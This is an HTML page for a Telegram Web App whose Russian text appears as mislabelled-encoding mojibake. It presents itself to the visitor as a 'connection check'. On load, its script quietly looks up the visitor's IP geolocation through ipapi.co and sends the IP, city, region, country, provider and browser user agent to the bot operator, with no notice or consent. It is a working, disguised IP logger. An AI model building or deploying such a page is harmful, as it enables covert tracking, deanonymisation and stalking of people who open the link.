<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    async function sendData() {
      // –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ WebApp —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ Telegram
      if (!Telegram.WebApp || !Telegram.WebApp.initData || Telegram.WebApp.initData.length === 0) {
        document.body.innerHTML = "<h2>‚ùå –û—Ç–∫—Ä–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ Telegram</h2>";
        return;
      }

      console.log("‚úÖ Telegram WebApp –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω");

      try {
        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
        const userAgent = navigator.userAgent;

        const payload = {
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name,
          org: ipData.org,
          ua: userAgent
        };

        console.log("üì® –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram:", payload);
        Telegram.WebApp.sendData(JSON.stringify(payload));
      } catch (e) {
        console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ:", e);
        document.body.innerHTML = "<h2>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏</h2><p>" + e.message + "</p>";
      }
    }

    // –ñ–¥—ë–º –ø–æ–ª–Ω–æ–π –∑–∞–≥—Ä—É–∑–∫–∏ –∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ Telegram
    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(sendData, 300);  // –¥–∞—ë–º Telegram —á—É—Ç—å –≤—Ä–µ–º–µ–Ω–∏
    });
  </script>
</head>
<body>
  <h2>üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...</h2>
  <p>–û–∫–Ω–æ –º–æ–∂–Ω–æ –∑–∞–∫—Ä—ã—Ç—å</p>
</body>
</html>
